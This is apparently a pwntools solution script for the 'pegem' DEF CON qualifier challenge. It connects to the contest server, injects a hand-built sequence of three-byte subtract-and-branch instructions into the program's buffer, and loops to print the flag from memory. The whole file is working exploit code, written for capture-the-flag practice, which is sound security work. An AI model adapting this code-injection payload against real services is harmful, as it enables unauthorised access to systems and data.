from pwn import *

# p = process('./pegem')
p = remote('pegem_d144a0fa24a0fc17809d4f56600bc740.quals.shallweplayaga.me', 1234)

with open('answer.txt') as f:
    answer = f.read()

p.send(answer)

p.recvuntil('your name: ')

'''
0x55ef10ae4020 <PROG>
0x55ef10ae4184 <PROG[178]> <- start of our input

Flag is from PROG[3]
'''


def instruction(i1, i2, i3):
    return chr(i1)+chr(i2)+chr(i3)

__FLAG__ = 3
__MINUS_ONE__ = 0
__DUMMY__ = 0xff

CONST = 0xb2

'''
0 - minus
1 - const 0
2 - const 1
3 - const -1
'''
payload = '\x00\x00\x01\x00'
CODE = CONST + len(payload)

# const[3] = -1, __MINUS_ONE__ = -1
payload += instruction(CONST+2, CONST+3, CODE+3)
payload += instruction(CONST+2, CODE+13, CODE+6)

# print loop
payload += instruction(CONST+2, __FLAG__, CODE+6)  # self loop if 0
payload += instruction(CONST+3, __FLAG__, __DUMMY__)
payload += instruction(__FLAG__, __MINUS_ONE__, __DUMMY__)

# increse FLAG
payload += instruction(CONST+3, CODE+7, __DUMMY__)
payload += instruction(CONST+3, CODE+10, __DUMMY__)
payload += instruction(CONST+3, CODE+12, __DUMMY__)
payload += instruction(CONST+1, CONST+0, CODE+6)

payload += 'AB'
payload += instruction(CONST+1, CONST+0, CODE) * 200

p.send(payload)
log.success('Flag: ' + p.recvall()[:-16])
